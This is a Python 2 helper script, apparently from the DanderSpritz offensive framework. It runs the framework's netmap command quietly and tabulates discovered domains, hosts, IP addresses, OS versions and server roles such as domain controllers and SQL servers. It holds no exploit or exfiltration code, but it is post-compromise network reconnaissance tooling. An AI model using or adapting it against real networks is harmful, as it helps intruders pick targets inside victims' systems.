
import dsz, dsz.cmd, dsz.control
import ops, ops.data
from ops.pprint import pprint
import traceback, sys
from optparse import OptionParser
from collections import defaultdict
MINIMAL = False
TYPE = ''

def runnetmap():
    minimal_string = (' -minimal' if MINIMAL else '')
    dsz.control.echo.Off()
    (succ, cmdid) = dsz.cmd.RunEx(('netmap%s%s' % (TYPE, minimal_string)), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    netmap_object = ops.data.getDszObject(cmdid=cmdid, cmdname='netmap')
    return netmap_object

def printoutput(masterlist, itemlist):
    masterlist.sort()
    try:
        pprint(masterlist, itemlist)
    except:
        pass
    if (not MINIMAL):
        print '\n\nPDC: Primary domain controller, SQL: Server running Microsoft SQL Server'
        print 'NTP: Server running the Timesource service, PQ: Server sharing print queue'
        print 'DI: Server running dial-in service, Xe: Xenix server, Term: Terminal Server'
        print 'O: Other'

def add_empty_domains(masterlist, domain_list):
    domains_in_map = [host[0] for host in masterlist]
    for domain in domain_list:
        if (domain in domains_in_map):
            continue
        if MINIMAL:
            masterlist.append([domain, '<NO HOSTS PRESENT>', '', ''])
        else:
            masterlist.append([domain, '<NO HOSTS PRESENT>', '', '', '', ''])
    return masterlist

def main():
    object = runnetmap()
    masterlist = []
    if MINIMAL:
        itemlist = ['Parent', 'Name', 'IP', 'Comment']
    else:
        itemlist = ['Parent', 'Name', 'IP', 'OS', 'Ver', 'Comment', 'Software']
    domain_list = []
    for item in object.netmapentryitem:
        if (item.level == 1):
            domain_list.append(item.remotename)
        if (item.level != 2):
            continue
        ipstring = (', '.join(item.ip) if item.ip else '')
        remote_name = item.remotename.replace('\\\\', '')
        if MINIMAL:
            masterlist.append([item.parentname, remote_name, ipstring, item.comment])
            continue
        name_map = defaultdict((lambda : 'O'))
        name_map.update({'primary domain controller': 'PDC', 'server running microsoft sql server': 'SQL', 'server running the timesource service': 'NTP', 'server sharing print queue': 'PQ', 'server running dial-in service': 'DI', 'xenix server': 'Xe', 'terminal server': 'Term'})
        softwarelist = [name_map[entry.description.lower()] for entry in item.software]
        softwarelist = list(set(softwarelist))
        softwarelist.sort()
        softwarestring = ','.join(softwarelist)
        os_ver = ('%s.%s' % (item.osversionmajor, item.osversionminor))
        os_ver = ('' if (os_ver == '0.0') else os_ver)
        final_item = [item.parentname, remote_name, ipstring, item.osplatform, os_ver, item.comment, softwarestring]
        masterlist.append(final_item)
    masterlist = add_empty_domains(masterlist, domain_list)
    printoutput(masterlist, itemlist)
if (__name__ == '__main__'):
    usage = 'python windows\netmap.py [Options]\n-m, --minimal \n    Runs netmap with the -minimal flag\n-t, --type\n    Type must be one of <all|connected|remembered>\n'
    parser = OptionParser(usage=usage)
    parser.add_option('-m', '--minimal', dest='minimal', action='store_true', default=False)
    parser.add_option('-t', '--type', dest='type', action='store', type='string', default=None, help='Type must be one of <all|connected|remembered>')
    (options, args) = parser.parse_args(sys.argv)
    if options.minimal:
        MINIMAL = True
    if options.type:
        if (not ((options.type.lower() == 'all') or (options.type.lower() == 'connected') or (options.type.lower() == 'remembered'))):
            print 'Type must be one of <all|connected|remembered>'
            sys.exit(1)
        else:
            TYPE = (' -type %s' % options.type.lower())
    main()